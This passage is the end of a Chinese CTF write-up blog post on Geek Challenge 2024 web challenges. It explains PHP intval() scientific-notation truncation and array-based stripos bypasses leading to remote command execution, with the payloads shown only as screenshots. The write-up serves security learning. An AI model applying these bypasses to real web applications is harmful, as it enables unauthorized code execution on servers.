+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">在intval处理后就是2023，是满足&lt;2024的，但是后面的intval($year+1)&gt;2025是为什么可以满足呢？</span><br><span class="line">在 $year + 1 中，如果 $year 是字符串，PHP 会尝试将其转换为数字。</span><br><span class="line">&quot;2023e1&quot; + 1 返回 20231（因为 &quot;2023e1&quot; 被解析为科学计数法，即 2023 * 10^1 = 20230，加 1 后为 20231）。</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982024/image-20250325113914557.png" alt="image-20250325113914557"></p>
+<p>然后$purpose的话需要绕过stripos</p>
+<h2 id="绕过stripos"><a href="#绕过stripos" class="headerlink" title="绕过stripos"></a>绕过stripos</h2><p>用数组可以绕过这个判断，stripos在处理数组的时候会返回null，是等于false的</p>
+<p><img src="/../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982024/image-20250325114440904.png" alt="image-20250325114440904"></p>
+<p>最后code就传命令进行rce就行</p>
+<p><img src="/../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982024/image-20250325114545681.png" alt="image-20250325114545681"></p>
+<h1 id="ezpop"><a href="#ezpop" class="headerlink" title="ezpop"></a>ezpop</h1></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">wanTh3flag</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2025/03/25/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982024wp-web/">http://example.com/2025/03/25/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982024wp-web/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">root@wanth3f1ag</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982024/">极客大挑战2024</a></div><div class="post-share"><div class="social-share" data-image="/image/8.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2025/03/25/CVE-2017-15715%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="CVE-2017-15715漏洞复现"><img class="cover" src="/image/8.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">CVE-2017-15715漏洞复现</div></div><div class="info-2"><div class="info-item-1">漏洞信息0x01漏洞描述Apache HTTPD是一款HTTP服务器，它可以通过mod_PHP来运行PHP网页。其2.4.0~2.4.29版本中存在一个解析漏洞，此漏洞的出现是由于 apache 在修复第一个后缀名解析漏洞时，用正则来匹配后缀。在解析 php 时 xxx.php\x0A 将被按照 php 后缀进行解析，导致绕过一些服务器的安全策略。 0x02影响版本Apache HTTPD 2.4.0~2.4.29 0x03漏洞分析index.php源码 12345678910111213141516171819202122232425262728293031323334&lt;?phpif(isset($_FILES[&#x27;file&#x27;])) &#123;    $name = basename($_POST[&#x27;name&#x27;]);    $ext = pathinfo($name,PATHINFO_EXTENSION);    if(in_array($ext, [&#x27;php&#x27;, &#x27;php3&#x27;,...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/image/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">wanTh3flag</div><div class="author-info-description">web低手</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">56</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">50</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">23</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">只会做签到题，签完到就走</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01%E5%89%8D%E8%A8%80"><span class="toc-text">0x01前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02%E8%B5%9B%E9%A2%98"><span class="toc-text">0x02赛题</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#baby-upload"><span class="toc-text">baby_upload</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Problem-On-My-Web"><span class="toc-text">Problem_On_My_Web</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#rce-me"><span class="toc-text">rce_me</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#intval-%E7%9A%84%E6%88%AA%E6%96%AD%E7%89%B9%E6%80%A7"><span class="toc-text">intval() 的截断特性</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87stripos"><span class="toc-text">绕过stripos</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ezpop"><span class="toc-text">ezpop</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/03/25/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982024wp-web/" title="极客大挑战2024wp--web">极客大挑战2024wp--web</a><time datetime="2025-03-25T07:07:48.000Z" title="发表于 2025-03-25 15:07:48">2025-03-25</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/03/25/CVE-2017-15715%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="CVE-2017-15715漏洞复现">CVE-2017-15715漏洞复现</a><time datetime="2025-03-25T01:50:36.000Z" title="发表于 2025-03-25 09:50:36">2025-03-25</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/03/24/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020wp-web(%E5%B7%B2%E5%81%9A%E5%AE%8C)/" title="极客大挑战2020wp--web(已做完)">极客大挑战2020wp--web(已做完)</a><time datetime="2025-03-24T12:40:24.000Z" title="发表于 2025-03-24 20:40:24">2025-03-24</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/03/24/CVE-2019-11043%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="CVE-2019-11043漏洞复现">CVE-2019-11043漏洞复现</a><time datetime="2025-03-24T02:59:35.000Z" title="发表于 2025-03-24 10:59:35">2025-03-24</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/03/23/weblogic%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/" title="记一次weblogic-10.3.6.0靶场漏洞利用">记一次weblogic-10.3.6.0靶场漏洞利用</a><time datetime="2025-03-23T11:17:18.000Z" title="发表于 2025-03-23 19:17:18">2025-03-23</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/image/8.jpg);"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2025 By wanTh3flag</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-fluttering-ribbon.min.js"></script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-heart.min.js" async="async" mobile="false"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
